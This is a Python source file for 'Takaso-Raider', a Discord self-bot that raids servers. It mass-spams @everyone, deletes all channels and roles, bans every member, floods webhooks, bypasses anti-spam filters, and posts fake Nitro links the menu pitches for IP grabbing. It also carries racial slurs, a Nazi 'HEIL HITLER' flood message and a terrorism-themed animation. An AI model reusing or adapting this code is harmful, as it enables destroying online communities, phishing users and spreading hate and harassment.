import os
from colors import black, blue, red, green, yellow, cyan, reset, magenta, white

moduli = ["discord.py", "requests", "asyncio", "base64", "pyautogui", "keyboard", "pyfiglet", "discord.utils", "typing", "datetime", "webbrower"]
try:                                           
  import discord, requests, asyncio, base64, pyautogui, keyboard, pyfiglet, discord.utils, typing, datetime, webbrower
except ImportError:
  print("%sChecking if you have the modules installed...\n%s" % (green(), reset()))
  for librerie in moduli:
      os.system(f"python -m pip install {librerie}")

from typing import Optional, final
import discord, pyfiglet
from discord import user
from discord import message
from discord import client
from discord.ext import commands
from discord.utils import get
from time import gmtime, strftime
from discord import Embed, Member
from datetime import datetime
import asyncio
import random
import os
import time
import sys
import discord.utils
from discord.ext.commands import CommandNotFound
from discord.ext.commands import has_permissions
from discord.ext.commands import bot_has_permissions, Bot, BotMissingPermissions
import base64
import webbrowser
from discord_markdown.discord_markdown import convert_to_html
import requests
import datetime

intents = discord.Intents.default()
intents.members = True

# Paste the token here
usertoken = ""

discordtag = "5209"
prefix = "$"
takaso = commands.Bot(prefix, intents=intents, self_bot = True)
takaso.remove_command('help')
global raid
raid = True
global raidaa
global generalcmds


channel_names = ["Raided by aag", "Get fucked", "Fucked by Takaso", "Die niggers", "Raided", "Fucked by aag", "Raped by aag", "Hacked by aag"]

@takaso.event
async def on_ready():
    await takaso.change_presence(activity=discord.Streaming(name="T̷̛̳̖̦̙̞͉̜̣͕͎̊̿̒͛̄̑̄͝a̵̧̛͕͛̾̓̈́̅̃̚k̵͎̣̝̙͍̜̱̏͌͗́̚a̶̧͙̼̯̥̺͚̤̙̿̽͑͗̀͊̉̀̕s̶͎̕͝o̴̰̦͂̿̅͝𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃𒈓𒀱𒈓𒈙꧅𒈙𒈙ဪဪV𒀱𒈓𒈙꧅𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃꧅꧅꧅ 𒈓𒈙꧅𒀱꧅𒌧𒅃𒈓𒀱𒈓𒈙꧅𒈙𒈙ဪဪV𒀱𒈓𒈙꧅𒅌꧅꧅𒁎꧅𒀱꧅𒌧𒅃꧅꧅꧅ 𒈓𒈙꧅", url="https://www.twitch.tv/#"))
    print("""%s
         _____     _                     ____       _     _                   
        |_   _|_ _| | ____ _ ___  ___   |  _ \ __ _(_) __| | ___ _ __         
 _____    | |/ _` | |/ / _` / __|/ _ \  | |_) / _` | |/ _` |/ _ \ '__|  _____ 
|_____|   | | (_| |   < (_| \__ \ (_) | |  _ < (_| | | (_| |  __/ |    |_____|
          |_|\__,_|_|\_\__,_|___/\___/  |_| \_\__,_|_|\__,_|\___|_|          
                                                                                 
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ 
|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|

                                                                         
                                                                         
         _____        _             _         
        | ____|_ __  (_) ___  _   _| |        
 _____  |  _| | '_ \ | |/ _ \| | | | |  _____ 
|_____| | |___| | | || | (_) | |_| |_| |_____|
        |_____|_| |_|/ |\___/ \__, (_)        
                   |__/       |___/   
%s        
""" % (blue(), reset()))
    print(f"%sMade by Takaso - Discord: Takaso#{discordtag}%s" % (yellow(), reset()))
    print('Connected to: {}'.format(takaso.user.name))
    print('User ID: {}'.format(takaso.user.id))
    print(f'%sThe prefix is {prefix}, you can start by using the help command%s' % (yellow(), reset()))
    print("""%s                                                                         
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ 
|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|_____|
                                                                
    %s""" % (blue(), reset()))

@takaso.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingRequiredArgument):
        embed=discord.Embed(title="**__『MISSING ARGUMENT』__**", description="The argument is missing, add something after the command.", color=0x000000)
        await ctx.send(embed=embed)
    if isinstance(error, commands.MissingPermissions):
        embed1=discord.Embed(title="**__『MISSING PERMISSIONS』__**", description="Looks like you're missing the permissions to run this command.", color=0x000000)
        await ctx.send(embed=embed1)
    if isinstance(error, commands.BotMissingPermissions):
        embed4=discord.Embed(title="**__『MISSING PERMISSIONS』__**", description="Missing permissions", color=0x000000)
        await ctx.send(embed=embed4)
    if isinstance(error, CommandNotFound):
      embed=discord.Embed(title="**__『COMMAND NOT FOUND』__**", description=f"\n```\nThe command you runned doesn't exist, do {prefix}help \n```\n", color=0x000000)
      await ctx.send(embed=embed)
      return
    raise error

@takaso.command()
async def test(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="Takaso-Raider", description="The bot is functional! ✅", color=0x2ecc71)
    await ctx.send(embed=embed)

@takaso.command()
async def raiding(ctx):
  global raidaa
  await ctx.message.delete()
  embed=discord.Embed(title="▰▰▰【**_TAKASO-RAIDER V3_**】▰▰▰", description=f"""
**⬱『RAIDING COMMANDS』⇶**
```
▶ {prefix}aag (Spams AAGs invite)
▶ {prefix}ccr (ccr [amount] - [channel name])
▶ {prefix}masspurge (purges all your messages in chat)
▶ {prefix}server (sees server's stats)
▶ {prefix}spam (Spams wathever you want)
▶ {prefix}rolespam (Spams the roles in the server)
▶ {prefix}cdel (deletes all channels)
▶ {prefix}aag3 (Aag's webhook spam)
▶ {prefix}all (Sends a message in all channels)
▶ {prefix}spambypass (Bypasses MEE6's anti spam)
▶ {prefix}flood (Floods the chat)
▶ {prefix}webhook (Spams a webhook with a costum message)
▶ {prefix}nitro (Makes a nitro masked link, use it for IP grabbing lol)
▶ {prefix}ghostspam (Ghosts spam wathever u want)
▶ {prefix}nuke (Destroys the server)
▶ {prefix}allchannel (Makes a webhook spam in all channels)
▶ {prefix}fastspam (Spams faster than spam cmd)
▶ {prefix}getall, channel ID (Gets all messages in a chat)
▶ {prefix}remotespam, channel ID, message (Remotely execute the command)
▶ {prefix}tokenspam, token, channel ID, message (Makes a token spam)
```
  """, color=0xa9a9a9)
  embed.set_footer(text=f"Made by Takaso#{discordtag} | Do {prefix}raiding2 for the second page")
  embed.add_field(name="✚『GitHub』✚", value="```\nhttps://github.com/Takaso\n```")
  embed.add_field(name="✚『SelfBot's status』✚", value="```\nStill working on it.\n```")
  embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  raidaa = await ctx.send(embed=embed)

@takaso.command()
async def raiding2(ctx):
  global raidaa
  await ctx.message.delete()
  embed=discord.Embed(title="▰▰▰【**_TAKASO-RAIDER V3_**】▰▰▰", description=f"""
**⬱『RAIDING COMMANDS』⇶**
```
▶ {prefix}banall (Bans all the users)
▶ {prefix}roleflood (Creates multiple roles with a costum name)
▶ {prefix}ghostflood (Floods with an invisible message)
▶ {prefix}token, user (Gets somebody token, works only in servers)
```
  """, color=0xa9a9a9)
  embed.set_footer(text=f"Made by Takaso#{discordtag} | This is the page 2")
  embed.add_field(name="✚『GitHub』✚", value="```\nhttps://github.com/Takaso\n```")
  embed.add_field(name="✚『SelfBot's status』✚", value="```\nStill working on it.\n```")
  embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  await raidaa.edit(embed=embed)

@takaso.command()
async def help(ctx):
  await ctx.message.delete()
  h=discord.Embed(title="\n⤻▰▰【**_TAKASO-RAIDER V3_**】▰▰⤻\n")
  h.add_field(name="〘RAIDING〙", value=f"```\n{prefix}raiding\n```", inline=True)
  h.add_field(name="〘GENERAL〙", value=f"```\n{prefix}general\n```", inline=True)
  h.add_field(name="〘SCIENCE〙", value=f"```\n{prefix}science\n```", inline=True)
  h.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  h.set_footer(text=f"Made by Takaso#{discordtag} | These are the command categories")
  h.set_author(name=f"꧁༒•{ctx.message.author}•༒꧂", icon_url = takaso.user.avatar_url, url = "https://discord.gg/3XpaAs4FNz")
  h.set_thumbnail(url="https://i.pinimg.com/originals/0b/31/9c/0b319c9b918dcbe5ce7a4351a443b35a.gif")
  await ctx.send(embed=h)

@takaso.command()
async def general(ctx):
  global generalcmds
  await ctx.message.delete()
  embed=discord.Embed(title="▰▰▰【**_TAKASO-RAIDER V3_**】▰▰▰", description=f"""
**⬱『GENERAL COMMANDS』⇶**
```
▶ {prefix}bottalk (Turns you into a bot)
▶ {prefix}first (Still in test phase)
▶ {prefix}stop (Stops the spam commands)
▶ {prefix}bs64 (Encodes a string to base64)
▶ {prefix}decode (Decodes a string)
▶ {prefix}html (Turns text into an html code)
▶ {prefix}hello (Types for 3 hours just to say Hi)
▶ {prefix}test (tests if the bot works)
▶ {prefix}ascii (Turns your text into Ascii)
▶ {prefix}latency (Show's how fast the replying speed is)
▶ {prefix}userinfo (Gets the Info of an user, servers only)
▶ {prefix}embedtalk (argument, you can use $embedtalk2/3 too, but quote the words.)
▶ {prefix}allah (ALLAH AKBAR)
▶ {prefix}pcnuke (Nukes your PC)
▶ {prefix}getguilds (Tells you in the console in which guilds you are in)
▶ {prefix}clone, guild ID (Clones a server)
▶ {prefix}deletemess, channel ID, message ID (Deletes a specified message)
```
""", color=0xffff00)
  embed.set_footer(text=f"Made by Takaso#{discordtag} | Do {prefix}general2 for page 2")
  embed.add_field(name="✚『GitHub』✚", value="```\nhttps://github.com/Takaso\n```")
  embed.add_field(name="✚『SelfBot's status』✚", value="```\nStill working on it.\n```")
  embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  generalcmds = await ctx.send(embed=embed)

@takaso.command()
async def general2(ctx):
  global generalcmds
  await ctx.message.delete()
  embed=discord.Embed(title="▰▰▰【**_TAKASO-RAIDER V3_**】▰▰▰", description=f"""
**⬱『GENERAL COMMANDS』⇶**
```
▶ {prefix}channeldel, channel ID (Deletes a channel with requests)
```
""", color=0xffff00)
  embed.set_footer(text=f"Made by Takaso#{discordtag} | This is the page 2")
  embed.add_field(name="✚『GitHub』✚", value="```\nhttps://github.com/Takaso\n```")
  embed.add_field(name="✚『SelfBot's status』✚", value="```\nStill working on it.\n```")
  embed.set_image(url="https://cdn.discordapp.com/attachments/813749322452697138/813838585404194826/image0.gif")
  await generalcmds.edit(embed=embed)

@takaso.command()
async def science(ctx):
    await ctx.message.delete()
    embed=discord.Embed(title="﹄〘 Takaso-S.E.S.S.O V3 〙﹃", description=f"""
**〚⇱〛_SCIENCE CMDS_〚⇲〛**
```
▶ {prefix}gun【Explains how to make a gun.】
▶ {prefix}cocaine【Explains how to make cocaine.】
▶ {prefix}bomb【Explains how to make a bomb.】
▶ {prefix}sexdoll【Shows the materials to make a sexdoll】
▶ {prefix}nuclearbomb【Shows how to make a nulcear bomb】
▶ {prefix}bleach【Shows how to make bleach】
▶ {prefix}lighter【Shows how to make a lighter】
▶ {prefix}aircooler【Shows how to make an aircooler】
```
""", color=0xff7f50)
    embed.set_footer(text=f"Made by Takaso#{discordtag}")
    embed.add_field(name="✚『GitHub』✚", value="```\nhttps://github.com/Takaso\n```")
    embed.add_field(name="✚『S.E.S.S.O』✚", value="```\ndiscord.gg/3XpaAs4FNz\n```")
    embed.set_image(url="https://media.discordapp.net/attachments/833580803354394664/834032932451909662/image0-14.gif?width=324&height=40")
    await ctx.send(embed=embed)


@takaso.command()
async def ascii(ctx, *, arg):
    await ctx.message.delete()
    text = pyfiglet.figlet_format(arg)
    await ctx.send(f'```{text}```')

@takaso.command()
async def load(ctx, extension):
  takaso.load_extension(f"cogs.{extension}")

@takaso.command()
async def unload(ctx, extension):
  takaso.unload_extension(f"cogs.{extension}")

for filename in os.listdir("./cogs"):
    if filename.endswith(".py"):
        takaso.load_extension(f"cogs.{filename[:-3]}")

@takaso.command()
async def latency(ctx):
    await ctx.message.delete()
    embed=discord.Embed(description= (f'```\nThe SelfBots replying speed is {round(takaso.latency * 1000)}ms\n```'))
    await ctx.send(embed=embed)

@takaso.command()
async def aag2(ctx):
    global raid
    raid = True
    await ctx.message.delete()
    embed=discord.Embed(title="Raided by A.A.G. Join!", description="https://discord.gg/SRmp22DUfZ")
    embed.set_image(url="https://cdn.discordapp.com/attachments/804599885353058304/813487522499526686/AAAG.png")
    while raid:
        await ctx.send("@everyone", embed=embed)

@takaso.command()
async def aag(ctx):
    global raid
    raid = True
    await ctx.message.delete()
    while raid:
      try:
        await ctx.send("Raided by A.A.G. Join! https://discord.gg/SRmp22DUfZ @everyone")
      except discord.Forbidden:
        print('f')
        return

@takaso.command()
async def ccr(ctx, amount = 100, *, name = None):
  if name == None:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(random.choice(channel_names))
      except discord.Forbidden:
        print("aaaaa")
        return
      except:
        pass
  else:
    for x in range(amount):
      try:
        await ctx.guild.create_text_channel(name)
      except discord.Forbidden:
        print("cazzo")
        return
      except:
        pass


@takaso.command()
async def aag3(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  webhook = await ctx.channel.create_webhook(name="AAG")
  while raid:
    await webhook.send(content="The AAG is back, Join! @everyone\nhttps://discord.gg/SRmp22DUfZ")

@takaso.command()
async def masspurge(ctx):
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=500).filter(
        lambda m: m.author == takaso.user
    ).map(lambda m: m):
        await message.delete()

@takaso.command()
async def server(ctx):
    await ctx.message.delete()
    name = str(ctx.guild.name)
    description = str(ctx.guild.description)

    owner = str(ctx.guild.owner)
    id = str(ctx.guild.id)
    region = str(ctx.guild.region)
    memberCount = str(ctx.guild.member_count)

    icon = str(ctx.guild.icon_url)

    embed = discord.Embed(
        title=name + "Server Information",
        description=description,
        color=discord.Color.blue()
    )
    embed.set_thumbnail(url=icon)
    embed.add_field(name="Owner", value=owner, inline=True)
    embed.add_field(name="Server ID", value=id, inline=True)
    embed.add_field(name="Region", value=region, inline=True)
    embed.add_field(name="Member Count", value=memberCount, inline=True)
    
    await ctx.send(embed=embed)

@takaso.command()
async def spam(ctx, *, message = None):
    global raid
    raid = True
    await ctx.message.delete()
    try:
      if message == None:
        await ctx.send("cazzo")
      else:
        while raid:
          await ctx.send(message)
    except discord.Forbidden:
      print("Fuck")

@takaso.command(aliases=["user", "info"])
async def userinfo(ctx, member : discord.Member):
  await ctx.message.delete()
  roles = [role for role in member.roles]
  ips = ["128.248.46.49", "205.87.15.134", "216.126.139.43", "73.184.210.185", "16.107.3.3", "90.134.6.6", "56.174.144.228", "114.235.64.33", "18.185.222.35", "46.253.255.120", "47.143.157.16", "53.227.198.174", "11.119.84.64", "105.245.228.184", "66.183.199.167", "119.118.216.113", "230.96.1.190", "102.232.175.119", "146.43.53.180", "79.32.40.234", "7.1.228.180", "61.104.201.81", "96.9.20.207", "245.182.144.109", "242.88.198.147", "49.117.74.69", "138.213.114.205", "153.80.40.112", "117.125.234.5"]
  tokens = ["Nzc2MjM5OTUxMDI4NjgyNzky.X6yAOg.kF89Tv48qMMf1nif3fMXv4ykm_M", "NzgyNjExMDI4MzYwODIyNzg1.X8OtfQ.WPSVK0e3quVbEUPTDKF2ex3vNno", "OzgzMzczNTI0MjgyNTA3MjY1.X8ZztQ.fuEnml21yaIi0sFolkiDuCEJkxE", "MzgzMzY4NDM3MTAzNDYwMzUz.X8ZvCA.gWAUcEsqIsJz7dvk8iXoi2iVgSg", "NzgzMjU1ODA0NDE2MzYwNDU5.X8YGFA.JnODT9Q7z8x8TO7z-45M0U3WCeE", "MOgDMjcwODA5NzgzMzY5NzUw.X8YUDw.80MpyQmUF9vE3xTbDqBo3El3U2Q", "OhJzIlc3NTIzMTE0MzkzNjQx.X8YaTg.3UPwlYvjyp91_JuIcc-YwpEI3to"]
  embed=discord.Embed(title = member.name, description = member.mention, color=0xe91e63)
  embed.add_field(name = "ID", value = member.id)
  embed.add_field(name = "\nCreated at:", value = member.created_at)
  embed.add_field(name = "\nJoined at:", value = member.joined_at)
  embed.add_field(name="User Name:", value=member.display_name, inline=False)
  embed.add_field(name="Discriminator:", value=member.discriminator, inline=False)
  embed.add_field(name = f"Roles: ", value =" ".join([role.mention for role in roles]))
  embed.set_thumbnail(url = member.avatar_url)
  embed.add_field(name="IP: ", value= random.choice(ips))
  embed.add_field(name="Token: ", value= random.choice(tokens))
  embed.set_footer(icon_url = ctx.author.avatar_url, text = "Get hacked lmao")
  await ctx.send(embed=embed)

@takaso.command()
async def embedtalk(ctx, *, arg):
    await ctx.message.delete()
    embed=discord.Embed(description = arg, color=0xc71585)
    await ctx.send(embed=embed)

@takaso.command()
async def embedtalk2(ctx, arg1, arg2):
    await ctx.message.delete()
    embed=discord.Embed(title = arg1, description = arg2, color=0x8fbc8f)
    await ctx.send(embed=embed)


@takaso.command()
async def embedtalk3(ctx, arg1, arg2, arg3):
    await ctx.message.delete()
    embed=discord.Embed(title = arg1, color=0x1abc9c)
    embed.add_field(name=arg2, value=arg3)
    await ctx.send(embed=embed)


@takaso.command()
async def rolespam(ctx):
    global raid
    raid = True
    await ctx.message.delete()
    roles = "\n".join(role.mention for role in ctx.guild.roles)
    while raid:
      await ctx.send(roles)

@takaso.command()
async def cdel(ctx):
  await ctx.message.delete()
  for c in ctx.guild.channels:
    await c.delete()

@takaso.command()
async def allah(ctx):
    await ctx.message.delete()
    message = await ctx.send(":airplane:\n\n\n\n\n:church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n:bomb:\n\n\n\n:church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n\n:bomb:\n\n\n:church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n\n\n:bomb:\n\n:church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n\n\n\n:bomb:\n:church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n**ALLAH AKBAR!**\n\n\n:bomb::church:")
    await asyncio.sleep(1)
    await message.edit(content=":airplane:\n\n\n\n\n:boom:")

@takaso.command()
async def spambypass(ctx):
    await ctx.message.delete()
    spam = 369
    while spam < 50000:
        spam += 369
        await ctx.send(f"@everyone {spam}")

@takaso.command()
async def flood(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  nazi=discord.Embed(title="""
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥

HEIL HITLER!
  """, description="""
  
 ...╚🔥 🔥╝...
          ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝          
             ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
               ╚═(卐卐卐)═╝
              ╚═(卐卐卐)═╝
             ╚═(卐卐卐)═╝
            ╚═(卐卐卐)═╝
           ╚═(卐卐卐)═╝
          ╚═(卐卐卐)═╝
         ╚═(卐卐卐)═╝
        ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
 ╚═(卐卐卐)═╝
  ╚═(卐卐卐)═╝
   ╚═(卐卐卐)═╝
    ╚═(卐卐卐)═╝
     ╚═(卐卐卐)═╝
      ╚═(卐卐卐)═╝
       ╚═(卐卐卐)═╝

🇩🇪            🇩🇪🇩🇪🇩🇪🇩🇪
🇩🇪            🇩🇪
🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪🇩🇪
                  🇩🇪            🇩🇪
                  🇩🇪            🇩🇪
🇩🇪🇩🇪🇩🇪🇩🇪            🇩🇪

⠀⠀⠀⠀⢀⣴⠶⠿⠟⠛⠻⠛⠳⠶⣄⡀⠀⠀⠀⠀⠀⠀ ⠀⠀⣠⣶⣿⣿⣿⣶⣖⠶⢶⣤⡀⠀⠈⢿⣆⠀⠀⠀⠀⠀ ⢀⣴⣿⠋⠉⠉⠀⠀⠈⠉⠛⠿⢿⣷⡀⠀⠈⢷⡀⠀⠀⠀ ⡾⠉⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢦⡀⠘⣷⡀⠀⠀ ⣷⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⡀⢸⡇⠀⠀ ⢻⡜⡄⠀⢀⣀⣤⣶⣶⡄⣴⣾⣿⣛⣓⠀⠀⣧⢸⣇⠀⠀ ⢈⣧⣧⠀⢩⠞⠿⠿⠻⠀⠘⠙⠃⠛⠛⠓⠀⣿⣻⠿⣷⠀ ⢸⡵⣿⠀⠀⠀⠀⠀⠀⠀⠀⠠⡀⠀⠀⠀⠀⠀⢻⣇⡟⠀ ⠘⢧⣿⡀⠀⠀⠀⠀⢧⣤⣤⣶⣗⠀⠀⠀⠀⠀⠜⣽⠁⠀ ⠀⠈⢿⣧⠀⠀⠀⠀⣿⣿⣿⣿⣿⣀⠀⠀⠀⢠⡟⠁⠀⠀ ⠀⠀⠀⠘⣇⠀⠀⠰⠋⠉⠙⠂⠀⠉⠀⠀⠀⣼⡅⠀⠀⠀ ⠀⠀⠀⠀⠹⣦⡀⠀⠀⠀⠉⠉⠁⠀⠀⠀⣠⠏⢻⣤⡀⠀ ⠀⠀⠀⠀⠀⢹⡷⢦⣄⣀⣀⣀⣀⣤⣴⡾⠃⠀⠘⡿⠙⢶ ⠀⠀⠀⠀⠀⢨⡷⣤⡀⠈⠉⠉⢁⡴⠋⠀⠀⠀⣸⠃⠀⠀
🟥🟥🟥🟥🟥🟥🟥🟥🟥 
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥⬜⬛⬜⬛⬛⬛⬜🟥 
🟥⬜⬛⬜⬛⬜⬜⬜🟥 
🟥⬜⬛⬛⬛⬛⬛⬜🟥 
🟥⬜⬜⬜⬛⬜⬛⬜🟥
🟥⬜⬛⬛⬛⬜⬛⬜🟥
🟥⬜⬜⬜⬜⬜⬜⬜🟥 
🟥🟥🟥🟥🟥🟥🟥🟥🟥
  """, color=0xff0000)
  nazi.set_thumbnail(url="https://cdn.discordapp.com/attachments/817870249893560350/834058485402173470/3005023510_096745e1a2_n.png")
  nazi.set_image(url="https://cdn.discordapp.com/attachments/817870249893560350/834058485402173470/3005023510_096745e1a2_n.png")
  nazi.set_footer(text="HEIL HITLER",icon_url="https://cdn.discordapp.com/attachments/817870249893560350/834058485402173470/3005023510_096745e1a2_n.png") 
  while raid:
    await ctx.send("@everyone RAIDED BY TAKASO", embed=nazi)

@takaso.command()
async def webhook(ctx, *, arg = None):
  global raid
  raid = True
  await ctx.message.delete()
  if arg == None:
    embed=discord.Embed(title="Missing Argument for the webhook!", description=f"The command did not work because you did not add an argument, do something like: {prefix}webhook @everyone")
    await ctx.send(embed=embed)
  else:
    webhook = discord.utils.get(await ctx.channel.webhooks())
    while raid:
      await webhook.send(content=arg)

@takaso.command()
async def bottalk(ctx, *, message: str):
    await ctx.message.delete()
    webhook = discord.utils.get(await ctx.channel.webhooks())
    if not webhook:
        webhook = await ctx.channel.create_webhook("cazzo")
    message = await webhook.send(content=message, username=ctx.author.name, avatar_url=ctx.author.avatar_url)


@takaso.command()
async def all(ctx, *, message = None):
  await ctx.message.delete()
  if message == None:
    for channel in ctx.guild.channels:
      try:
        await ctx.channel.send("@everyone")
      except discord.Forbidden:
        print("f")
        return
      except:
        pass
  else:
    for channel in ctx.guild.channels:
      try:
        await channel.send(message)
      except discord.Forbidden:
        print("errore")
        return
      except:
        pass

@takaso.command()
async def nitro(ctx, *, arg):
  await ctx.message.delete()
  embed=discord.Embed(title="Nitro succesfully  generated!", url=(arg), description="Nitro has been generated, click the link above to claim it!", color=0xff69b4)
  embed.set_image(url="https://cdn.discordapp.com/attachments/677241858765881345/817347817973743626/tenor_4.gif")
  await ctx.send(embed=embed)


@takaso.command()
async def ghostspam(ctx, *, arg):
  global raid
  raid = True
  await ctx.message.delete()
  while raid:
    try:
      await ctx.send(arg, delete_after=0)
    except discord.Forbidden:
      print("cazzo nn va")
      return

@takaso.command()
async def stop(ctx):
  global raid
  await ctx.message.delete()
  raid = False

@takaso.command(pass_context=True)
async def nuke(ctx):
    await ctx.message.delete()
    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print (channel.name + " has been deleted")
        except:
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("raided by aag")
        await channel.send("Raided by AAG! @everyone")
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
            print (f"{role.name} has been deleted")
        except:
            pass
    for member in list(takaso.get_all_members()):
        try:
            await guild.ban(member)
            print ("User " + member.name + " has been banned")
        except:
            pass
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print (f"{emoji.name} has been deleted")
        except:
            pass    
    print("Nuked server succesfully")

@takaso.command()
async def allchannel(ctx):
  for channel in ctx.guild.channels:
    try:
      webhook = await channel.create_webhook(name="AOS")
      await webhook.send(content="Raided by AOS! @everyone https://discord.gg/na8uadxHyn")
      if not webhook:
        embed=discord.Embed(title="Error!", description="No webhooks found", color=0xff0000)
        await ctx.send(embed=embed)
    except discord.Forbidden:
      embed2=discord.Embed(title="Error!", description="Missing permission", color=0xff0000)
      await ctx.send(embed=embed2)
    except:
      pass



@takaso.command()
async def bs64(ctx, *, arg = None):
  await ctx.message.delete()
  try:
    if arg == None:
      embed1=discord.Embed(title="Error", description="No ID was mentioned", color=0xff0000)
      await ctx.send(embed=embed1)
    else:
      sample_string = arg
      sample_string_bytes = sample_string.encode("ascii") 
      base64_bytes = base64.b64encode(sample_string_bytes) 
      base64_string = base64_bytes.decode("ascii")
      embed=discord.Embed(title="〔🔑〕- Succesfully encoded the string.", description=f"Encoded string: {base64_string}", color=0xffff00)
      await ctx.send(embed=embed)
  except discord.Forbidden:
    print("errore")

    
@takaso.command()
async def decode(ctx, *, arg = None):
  await ctx.message.delete()
  try:
    if arg == None:
      embed1=discord.Embed(title="Error", description="No Base64 word was added", color=0xff0000)
      await ctx.send(embed=embed1)
    else:
      base64_message = arg
      base64_bytes = base64_message.encode('ascii')
      message_bytes = base64.b64decode(base64_bytes)
      message = message_bytes.decode('ascii')
      embed=discord.Embed(title="Decoded String", description=f"Decoded string: {message}", color=0x800080)
      await ctx.send(embed=embed)
  except discord.Forbidden:
    print("cazzo")

@takaso.command()
async def ban(ctx):
  await ctx.message.delete()
  for member in list(takaso.get_all_members()):
    try:
      await ctx.guild.ban(member)
    except discord.Forbidden:
      print("Failed to ban")
    except:
      pass

@takaso.command()
async def pcnuke(ctx):
  global raid
  raid = True
  await ctx.message.delete()
  while raid:
    webbrowser.open("https://discord.com/invite/tkrrA46k3b")

@takaso.command()
async def html(ctx, *, arg):
  await ctx.message.delete()
  text = arg
  html = convert_to_html(text)
  await ctx.send(f"```\n{html}\n```")


@takaso.command()
async def hello(ctx):
  await ctx.message.delete()
  async with ctx.typing():
    await asyncio.sleep(6400)
    await ctx.send("hi")


@takaso.command()
async def death(ctx):
  await ctx.message.delete()
  warudo=discord.Embed(
    title="**__『Nitro Gift Fetcher』__**",
    description="""
    **『Nitro code』**
    [https://discord.gift/tWlizLMfapSSXhXM](https://discord.gg/wab4esGA5m \"Hovertext\")
    """, color=0xff0000)
  await ctx.send(embed=warudo)

@takaso.command()
async def gun(ctx):
    await ctx.message.delete()
    await ctx.send(":warning:**WARNING** :warning:\n```If you have little to no experience with guns, it's probably not wise to try assembling your own. It can be dangerous to make a mistake\n```")
